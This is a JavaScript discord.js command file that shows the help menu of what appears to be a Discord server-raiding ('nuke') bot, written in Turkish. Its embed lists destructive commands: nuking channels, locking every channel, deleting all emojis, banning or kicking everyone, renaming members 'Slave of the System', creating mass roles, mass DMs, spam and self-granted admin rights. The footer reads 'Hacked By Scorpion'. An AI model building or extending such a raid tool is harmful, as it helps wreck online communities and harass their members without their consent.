const { EmbedBuilder } = require("discord.js");

module.exports = {
  name: "yardim",
  description: "Tüm yıkım cephaneliğini listeler.",
  async execute(message, args, client, config) {
    await message.delete().catch(() => { });

    const embed = new EmbedBuilder()
      .setTitle("👑 YIKIM PROTOKOLLERİ ARŞİVİ 👑")
      .setDescription(`Sistem Öneki: \`${config.prefix}\`\n\nBu parşömen, sadece kralların okuyabileceği yıkım emirlerini barındırır. Hata yapma.`)
      .setColor(0x6b0000)
      .addFields(
        {
          name: "⚔️ Katliam Protokolleri",
          value: [
            `\`${config.prefix}patlat\` — Sistemin sonunu getirir`,
            `\`${config.prefix}nuke\` — Bulunduğun kanalı küllerinden doğurur`,
            `\`${config.prefix}kilit\` — Tüm kanalları sessizliğe gömer`,
            `\`${config.prefix}silici\` — Tüm duygu ve ifadeleri siler (Emoji/Sticker)`,
          ].join("\n"),
          inline: false,
        },
        {
          name: "💀 İnfaz Emirleri",
          value: [
            `\`${config.prefix}ban\` — Herkesi hiçliğe gönderir`,
            `\`${config.prefix}kick\` — Zayıfları uzaklaştırır`,
            `\`${config.prefix}isimler\` — Herkesi 'Sistemin Kölesi' yapar`,
            `\`${config.prefix}rol\` — 50 kan kırmızı rol yaratır`,
          ].join("\n"),
          inline: false,
        },
        {
          name: "📢 Zihin Kontrolü",
          value: [
            `\`${config.prefix}dm <mesaj>\` — Zihinlere doğrudan ulaşır`,
            `\`${config.prefix}spam [mesaj]\` — Kanala korku aşılar`,
          ].join("\n"),
          inline: false,
        },
        {
          name: "🔧 Sistem Çekirdeği",
          value: [
            `\`${config.prefix}yetki\` — Sana mutlak güç (Admin) verir`,
            `\`${config.prefix}ayril\` — Karanlığa geri döner`,
            `\`${config.prefix}panel\` — Ana komuta merkezini açar`,
          ].join("\n"),
          inline: false,
        }
      )
      .setFooter({ text: "Sistem Hacked By Scorpion • Boyun Eğ!" })
      .setTimestamp();

    await message.channel.send({ embeds: [embed] }).catch(() => { });
  },
};
